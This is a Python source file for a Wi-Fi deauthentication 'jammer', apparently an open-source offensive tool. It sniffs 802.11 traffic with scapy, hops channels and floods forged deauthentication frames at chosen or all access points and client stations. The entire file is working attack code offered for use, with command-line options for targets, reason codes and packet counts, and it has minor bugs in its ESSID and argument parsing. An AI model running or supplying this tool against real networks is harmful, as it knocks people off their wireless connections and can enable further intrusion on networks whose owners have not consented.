#!/usr/bin/python
#Author: @hash3liZer

import sys
import argparse
import threading
import os
import time
import signal
import random
import subprocess
import re
from pull import PULL
from scapy.sendrecv import sniff
from scapy.sendrecv import sendp
from scapy.layers.dot11 import Dot11Beacon
from scapy.layers.dot11 import Dot11
from scapy.layers.dot11 import Dot11Elt
from scapy.layers.dot11 import RadioTap
from scapy.layers.dot11 import Dot11Deauth
from scapy.layers.dot11 import Dot11FCS
from scapy.layers.eap   import EAPOL

class JAMMER:

	__ACCESSPOINTS = []
	LOCK = threading.Semaphore(value=1)

	def __init__(self, prs):
		self.interface = prs.interface
		self.channel   = prs.channel
		self.essids    = prs.essids
		self.aps       = prs.aps
		self.stations  = prs.stations
		self.filters   = prs.filters
		self.code      = prs.code
		self.delay     = prs.delay
		self.packets   = prs.packets
		self.verbose   = prs.verbose

	def extract_essid(self, layers):
		essid = ''
		counter = 1
		layer = layers.getlayer(Dot11Elt, counter)
		while layer:
			if hasattr(layer, "ID") and layer.ID == 0:
				essid = layer.info.decode('ascii')
				break
			else:
				counter += 1

		return essid

	def forge(self, sn, rc):
		pkt = RadioTap() / Dot11(
				addr1=rc,
				addr2=sn,
				addr3=sn
			) / Dot11Deauth(
				reason=self.code
			)

		return pkt

	def get_ess(self, sn, rc):
		ess = ''
		for key in self.__ACCESSPOINTS:
			if key.get("bssid") == sn or key.get("bssid") == rc:
				ess = key['essid']
				break

		return ess

	def send(self, sender, receiver):
		pkts = (
			self.forge(sender, receiver),
			self.forge(receiver, sender)
		)

		self.LOCK.acquire()
		for pkt in pkts:
			sendp(
				pkt,
				iface=self.interface,
				count=self.packets,
				verbose=False
			)
			time.sleep(1)
		self.LOCK.release()
			
		essid = self.get_ess(sender, receiver)
		pull.print("*",
			"Sent Deauths Count [{count}] Code [{code}] {sender} -> {receiver} ({essid})".format(
				count=pull.RED+str(self.packets)+pull.END,
				code =pull.GREEN+str(self.code)+pull.END,
				sender=pull.DARKCYAN+sender.upper().replace(":", "")+pull.END,
				receiver=pull.DARKCYAN+receiver.upper().replace(":", "")+pull.END,
				essid=essid
			),
			pull.YELLOW
		)

	def deauthenticate(self, sender, receiver):
		if self.aps and self.stations and self.filters:
			if not sender in self.filters and not receiver in self.filters:
				if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
					self.send(
						sender,
						receiver
					)
		elif self.aps and self.stations and not self.filters:
			if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
				self.send(
					sender,
					receiver
				)
		elif self.aps and not self.stations and self.filters:
			if not sender in self.filters and not receiver in self.filters:
				if sender in self.aps or receiver in self.aps:
					self.send(
						sender,
						receiver
					)
		elif not self.aps and self.stations and self.filters:
			if not sender in self.filters and not receiver in self.filters:
				if sender in self.stations or receiver in self.stations:
					self.send(
						sender,
						receiver
					)
		elif self.aps and not self.stations and not self.filters:
			if sender in self.aps or receiver in self.aps:
				self.send(
					sender,
					receiver
				)
		elif not self.aps and not self.stations and self.filters:
			if not sender in self.filters and not receiver in self.filters:
				self.send(
					sender,
					receiver
				)
		elif not self.aps and self.stations and not self.filters:
			if sender in self.stations or receiver in self.stations:
				self.send(
					sender,
					receiver
				)
		else:
			self.send(sender, receiver)

	def injector(self, pkt):
		if pkt.haslayer(Dot11Beacon):
			macaddr = pkt.getlayer(Dot11FCS).addr2
			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
			toappend = {
				'bssid': macaddr,
				'essid': essid
			}
			if toappend not in self.__ACCESSPOINTS:
				self.__ACCESSPOINTS.append(
						toappend
					)
		elif pkt.haslayer(Dot11FCS) and pkt.getlayer(Dot11FCS).type == 2:
			sender   = pkt.getlayer(Dot11FCS).addr2
			receiver = pkt.getlayer(Dot11FCS).addr1

			self.deauthenticate(sender, receiver)

	def hopper(self, chs):
		if type(chs) == tuple:
			ch = random.choice(chs)
			while True:
				subprocess.call(['iwconfig', self.interface, 'channel', str(ch)])
				time.sleep(1)

				lc = ch
				ch = random.choice(chs)
				while ch == lc:
					ch = random.choice(chs)
		else:
			subprocess.call(['iwconfig', self.interface, 'channel', str(chs)])

	def engage(self):
		t = threading.Thread(target=self.hopper, args=(self.channel,))
		t.daemon = True
		t.start()

		sniff(iface=self.interface, prn=self.injector)

class PARSER:

	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel   = self.channel(opts.channel)
		#self.essids    = self.essids(opts.essids)
		self.aps       = self.aps(opts.aps)
		self.stations  = self.stations(opts.stations)
		self.filters   = self.filters(opts.filters)
		self.code      = opts.code if (opts.code >= 1 and opts.code <= 66) else pull.halt("Invalid Reason Code", True, pull.RED)
		self.delay     = opts.delay if opts.delay >= 0 else pull.halt("Invalid Delay Between Requests", True, pull.RED)
		self.packets   = opts.packets if opts.packets > 0 else pull.halt("Packets Must Be greater than 0", True, pull.RED)
		self.verbose   = opts.verbose
		self.signal    = signal.signal(signal.SIGINT, self.handler)

	def handler(self, sig, fr):
		pull.halt(
				"CTRL+C Received. Exiting", 
				True,
				"\r",
				pull.RED
			)

	def help(self, hl):
		if hl:
			pull.help()

	def channel(self, ch):
		chs = tuple(range(1,15))
		if ch:
			if ch in chs:
				return ch
			else:
				pull.halt("Not a Valid Channel. Choose in between 1-14.", True, pull.RED)
		else:
			return chs

	def essids(self, essids):
		retval = []
		if essids:
			essids = essids.split(",")
			for essid in essids:
				retval.append(essid)
		else:
			return []

	def aps(self, aps):
		retval = []
		if aps:
			aps = aps.split(",")
			for ap in aps:
				ap = ap.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ap):
					retval.append(ap)
				else:
					pull.halt("Not a Valid BSSID [%s]" % ap, True, pull.RED)
		else:
			return retval

	def stations(self, sts):
		retval = []
		if sts:
			sts = sts.split(",")
			for st in sts:
				st = st.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", st):
					retval.append(st)
				else:
					pull.halt("Not a Valid MAC Address [%s]" % st, True, pull.RED)
		else:
			return retval

	def filters(self, fts):
		retval = []
		if fts:
			fts = fts.split(",")
			for ft in fts:
				ft = ft.lower()
				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ft):
					retval.append(ft)
				else:
					pull.halt("Not a Valid MAC Address [%s]" % ft, True, pull.RED)
		else:
			return retval

	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		ifaces = getNICnames()
		if iface in ifaces:
			if confirmMon(iface):
				return iface
			else:
				pull.halt("Interface Not in Monitor Mode [%s]" % iface, True, pull.RED) 
		else:
			pull.halt("No Such Interface [%s]" % iface, True, pull.RED)


def main():
	parser = argparse.ArgumentParser( add_help=False )

	parser.add_argument('-h', '--help', dest="help", default=False, action="store_true")
	parser.add_argument('-i', '--interface', dest="interface", default="", type=str)
	parser.add_argument('-c', '--channel'  , dest="channel"  , default=0 , type=int)
	#parser.add_argument('-e', '-essids'    , dest="essids"   , default="", type=str)
	parser.add_argument('-a', '--access-points', dest="aps"  , default="", type=str)
	parser.add_argument('-s', '--stations' , dest="stations" , default="", type=str)
	parser.add_argument('-f', '--filters'  , dest="filters"  , default="", type=str)
	parser.add_argument('--code'           , dest="code"     , default=7 , type=int)
	parser.add_argument('--delay'          , dest="delay"    , default=0 , type=int)
	parser.add_argument('--packets'        , dest="packets"  , default=64, type=int)
	parser.add_argument('--verbose'        , dest="verbose"  , default=False, action="store_true")

	options = parser.parse_args()
	parser  = PARSER(options)

	pull.print(
		"*",
		"IFACE [{iface}] CH [{channel}]".format(
			iface=parser.interface,
			channel=("Hop" if type(parser.channel) == tuple else parser.channel)
		),
		pull.YELLOW
	)
	pull.print(
		"*",
		"APS [{bssids}] STS [{sts}] CODE [{code}]".format(
			bssids=len(parser.aps),
			sts   =len(parser.stations),
			code  =parser.code,
		),
		pull.RED
	)
	pull.print(
		"*",
		"FILTERS [{filters}] STS [{delay}] PKTS [{packets}]".format(
			filters=len(parser.filters),
			delay  =parser.delay,
			packets=parser.packets,
		),
		pull.GREEN
	)

	pull.print("^", "Engaging Now. Starting Jammer. ", pull.DARKCYAN)
	jammer = JAMMER(parser)
	jammer.engage()

if __name__ == "__main__":
	pull = PULL()
	main()